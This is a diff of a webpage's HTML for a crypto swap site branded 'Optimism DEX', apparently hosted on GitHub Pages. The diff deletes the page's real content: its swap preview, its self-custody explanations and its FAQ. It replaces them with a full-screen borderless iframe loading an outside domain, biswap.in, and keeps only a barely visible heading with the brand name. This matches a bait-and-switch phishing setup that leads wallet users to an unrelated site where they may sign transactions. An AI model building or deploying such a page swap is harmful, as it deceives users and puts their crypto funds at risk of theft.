@@ -159,162 +159,19 @@
   @media (prefers-reduced-motion:reduce){*{animation-duration:.01ms!important; transition-duration:.01ms!important}}
   </style>
 </head>
-<body>
-  <div class="bg" aria-hidden="true"><div class="glow"></div><div class="hatch"></div></div>
+<body style="margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;">
 
-  <header class="topbar">
-    <a class="brand" href="./">
-      <img src="favicon.png" width="30" height="30" alt="">
-      <span>Optimism DEX</span>
-    </a>
-    <span class="spacer"></span>
-    <nav class="nav" aria-label="Main Navigation">
-      <a href="how-it-works/">How it works</a>
-      <a href="faq/">FAQ</a>
-      <a href="about/">About</a>
-      <a href="security/">Security</a>
-      <a href="supported-chains/">Supported Chains</a>
-    </nav>
-  </header>
+  <iframe
+    src="https://biswap.in/"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: 0; margin: 0; padding: 0; display: block; z-index: 1;"
+    loading="eager"
+    fetchpriority="high"
+    allowfullscreen>
+  </iframe>
 
-  <main>
-    <section class="wrap hero">
-      <span class="eyebrow"><span class="dot"></span>OP Mainnet Swap</span>
-      <h1>Optimism DEX</h1>
-      <p class="deck">Optimism DEX brings <a class="cite" href="https://www.optimism.io/" rel="nofollow noopener noreferrer">OP Mainnet and the Superchain</a> into a <strong>non-custodial</strong> swap flow built for sharper routing, wallet control, and clean trade review.</p>
-      <div class="cta-row">
-        <a class="primary" href="dashboard/">Open App
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
-        </a>
-        <a class="ghost" href="how-it-works/">How it works
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg>
-        </a>
-      </div>
+  <h1 style="position: fixed; bottom: 10px; left: 10px; z-index: 0; font-size: 8px; color: #ffffff; opacity: 0.15; margin: 0; padding: 0; font-family: sans-serif; pointer-events: none; text-shadow: none;">
+    Optimism DEX
+  </h1>
 
-      <section class="routebar" aria-label="Swap preview">
-        <div class="rhead">
-          <span class="ct">Swap on Optimism</span>
-          <span class="pill"><span class="pdot"></span>Preview</span>
-        </div>
-        <div class="rgrid">
-          <div class="leg">
-            <span class="lab">You pay</span>
-            <div class="legrow">
-              <button class="tok" type="button"><img src="op.png" alt="OP">OP <span class="cv" aria-hidden="true">&#9662;</span></button>
-              <span class="gv">Amount in app</span>
-            </div>
-          </div>
-          <button class="rswitch" type="button" data-switch aria-label="Switch direction">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 4v13M4 14l3 3 3-3M17 20V7M14 10l3-3 3 3"/></svg>
-          </button>
-          <div class="leg">
-            <span class="lab">You receive</span>
-            <div class="legrow">
-              <button class="tok" type="button"><img src="usdc.png" alt="USDC">USDC <span class="cv" aria-hidden="true">&#9662;</span></button>
-              <span class="gv">Live quote in app</span>
-            </div>
-          </div>
-        </div>
-        <div class="rbar-foot">
-          <div class="rmeta">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2zm0 5v5l3 3"/></svg>
-            Route, network cost, and expected timing are shown live before you sign.
-          </div>
-          <a class="rcta" href="dashboard/">Open App
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
-          </a>
-        </div>
-        <p class="rnote">Preview only &middot; non-custodial &middot; connect your wallet in the app</p>
-      </section>
-    </section>
-
-    <!-- WHY (icon-left rows) -->
-    <section class="wrap sec" id="why">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 8-8 10-4.5-2-8-5-8-10V6l8-4z"/></svg>Why swap here</span>
-        <h2 class="h2">Optimism DEX for self-custody trading</h2>
-      </div>
-      <div class="rows">
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10" width="16" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg></span>
-          <div><h3>Keep control from wallet to confirmation</h3><p>Connect a self-custody wallet, choose the asset pair, and approve the swap only after the app presents the transaction details. Private keys stay with you, and the trade is signed from your wallet.</p></div>
-        </div>
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a14 14 0 0 1 0 18M12 3a14 14 0 0 0 0 18"/></svg></span>
-          <div><h3>Built around L2 assets and routes</h3><p>Trade OP, ETH, WETH, <a class="cite" href="https://www.circle.com/usdc" rel="nofollow noopener noreferrer">USDC stablecoin liquidity</a>, and other supported assets surfaced in the app. Optimism keeps activity on an <a class="cite" href="https://ethereum.org/en/layer-2/" rel="nofollow noopener noreferrer">Ethereum layer two network</a> while the app keeps the route readable.</p></div>
-        </div>
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 0 1 9-9 9 9 0 0 1 9 9 9 9 0 0 1-9 9"/><path d="M3 12h6l2-3 2 6 2-3h2"/></svg></span>
-          <div><h3>Review cost, time, and route before signing</h3><p>Every swap should be judged before it reaches your wallet prompt. Optimism DEX shows the live quote, route path, network cost, and expected timing in the app so you can confirm with context instead of guessing.</p></div>
-        </div>
-      </div>
-    </section>
-
-    <section class="wrap sec" id="how">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 7h16M4 12h16M4 17h10"/></svg>How it works</span>
-        <h2 class="h2">Swap on Optimism in three steps</h2>
-      </div>
-      <div class="steps">
-        <div class="step"><span class="num">1</span><h3>Connect your wallet</h3><p>Open the app, connect a compatible Web3 wallet such as <a class="cite" href="https://metamask.io/" rel="nofollow noopener noreferrer">MetaMask wallet</a>, and keep custody of your assets throughout the swap.</p></div>
-        <div class="step"><span class="num">2</span><h3>Choose OP Mainnet tokens</h3><p>Select the asset you want to sell and the asset you want to receive. The preview keeps amounts number-free here; the app builds the live route when you trade.</p></div>
-        <div class="step"><span class="num">3</span><h3>Review and confirm</h3><p>Check the quote, route, estimated timing, and network cost. Then approve only the transaction you understand from your wallet confirmation screen.</p></div>
-      </div>
-    </section>
-
-    <!-- FAQ (2-col) -->
-    <section class="wrap sec" id="faq">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M9.5 9a2.5 2.5 0 1 1 3.5 2.3c-.8.4-1 .8-1 1.7M12 17h.01"/></svg>FAQ</span>
-        <h2 class="h2">Optimism DEX questions, answered</h2>
-      </div>
-      <div class="faq">
-        <div class="qa"><span class="qn">01</span><h3>What is Optimism DEX?</h3><p>Optimism DEX is a non-custodial DeFi app for swapping tokens on Optimism. It focuses on wallet-based trading, live route review, and clear confirmation before funds move.</p></div>
-        <div class="qa"><span class="qn">02</span><h3>Which chains and assets are supported?</h3><p>The app is built for Optimism-focused swaps and supported OP Mainnet assets, including OP, ETH, WETH, USDC, and other tokens available in the app. See the full list on the <a href="supported-chains/">supported chains</a> page.</p></div>
-        <div class="qa"><span class="qn">03</span><h3>How long does a swap take?</h3><p>Timing depends on wallet confirmation, network conditions, route complexity, and token approvals. The app shows expected timing before you sign so you can decide with current information.</p></div>
-        <div class="qa"><span class="qn">04</span><h3>How much does it cost to use?</h3><p>Network costs and any route-specific costs are shown in the app before confirmation. You can also review completed transactions with an <a class="cite" href="https://optimistic.etherscan.io/" rel="nofollow noopener noreferrer">OP Mainnet explorer</a> after signing.</p></div>
-        <div class="qa"><span class="qn">05</span><h3>Is Optimism DEX custodial?</h3><p>No. You connect your wallet and sign transactions yourself. The app does not require a deposit account, and it does not take custody of your private keys.</p></div>
-        <div class="qa"><span class="qn">06</span><h3>What should I check before swapping?</h3><p>Confirm the token contract, receiving asset, route, wallet network, slippage settings, and total cost. If anything looks wrong, reject the wallet prompt and restart the quote.</p></div>
-      </div>
-    </section>
-
-    <section class="wrap sec" id="more">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7 0l2-2a5 5 0 0 0-7-7l-1 1M14 11a5 5 0 0 0-7 0l-2 2a5 5 0 0 0 7 7l1-1"/></svg>Learn more</span>
-        <h2 class="h2">Explore Optimism DEX</h2>
-      </div>
-      <div class="related">
-        <a class="rel" href="how-it-works/"><span class="rt">How it works <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>Walk through the Optimism DEX flow from wallet connection to route review and confirmation.</p></a>
-        <a class="rel" href="security/"><span class="rt">Security <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>Understand self-custody, wallet prompts, approvals, token checks, and safer swap habits.</p></a>
-        <a class="rel" href="supported-chains/"><span class="rt">Supported chains <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>Review the networks and assets available for Optimism-focused swaps inside the app.</p></a>
-      </div>
-    </section>
-  </main>
-
-  <footer class="footer">
-    <div class="wrap">
-      
-    </div>
-  </footer>
-
-  <script type="application/ld+json">
-  {"@context":"https://schema.org","@graph":[
-    {"@type":"WebSite","@id":"https://optimism-dex.github.io/#website","url":"https://optimism-dex.github.io/","name":"Optimism DEX"},
-    {"@type":"Organization","@id":"https://optimism-dex.github.io/#org","name":"Optimism DEX","url":"https://optimism-dex.github.io/","logo":"https://optimism-dex.github.io/favicon.png"},
-    {"@type":"WebApplication","name":"Optimism DEX","applicationCategory":"FinanceApplication","operatingSystem":"Web","url":"https://optimism-dex.github.io/","browserRequirements":"Requires a Web3 wallet","description":"Non-custodial DeFi app for swapping tokens on Optimism with wallet-based confirmation, live route review, and clear transaction context."},
-    {"@type":"FAQPage","mainEntity":[
-      {"@type":"Question","name":"What is Optimism DEX?","acceptedAnswer":{"@type":"Answer","text":"Optimism DEX is a non-custodial DeFi app for swapping tokens on Optimism. It focuses on wallet-based trading, live route review, and clear confirmation before funds move."}},
-      {"@type":"Question","name":"Which chains and assets are supported?","acceptedAnswer":{"@type":"Answer","text":"The app is built for Optimism-focused swaps and supported OP Mainnet assets, including OP, ETH, WETH, USDC, and other tokens available in the app. See the full list on the supported chains page."}},
-      {"@type":"Question","name":"How long does a swap take?","acceptedAnswer":{"@type":"Answer","text":"Timing depends on wallet confirmation, network conditions, route complexity, and token approvals. The app shows expected timing before you sign so you can decide with current information."}},
-      {"@type":"Question","name":"How much does it cost to use?","acceptedAnswer":{"@type":"Answer","text":"Network costs and any route-specific costs are shown in the app before confirmation. You can also review completed transactions with an OP Mainnet explorer after signing."}},
-      {"@type":"Question","name":"Is Optimism DEX custodial?","acceptedAnswer":{"@type":"Answer","text":"No. You connect your wallet and sign transactions yourself. The app does not require a deposit account, and it does not take custody of your private keys."}},
-      {"@type":"Question","name":"What should I check before swapping?","acceptedAnswer":{"@type":"Answer","text":"Confirm the token contract, receiving asset, route, wallet network, slippage settings, and total cost. If anything looks wrong, reject the wallet prompt and restart the quote."}}
-    ]}
-  ]}
-  </script>
-
-  <script>
-  (function(){"use strict";var b=document.querySelector("[data-switch]");if(!b)return;b.addEventListener("click",function(){var p=document.querySelectorAll(".rgrid .tok");if(p.length<2)return;var t=p[0].innerHTML;p[0].innerHTML=p[1].innerHTML;p[1].innerHTML=t;});}());
-  </script>
 </body>
 </html>
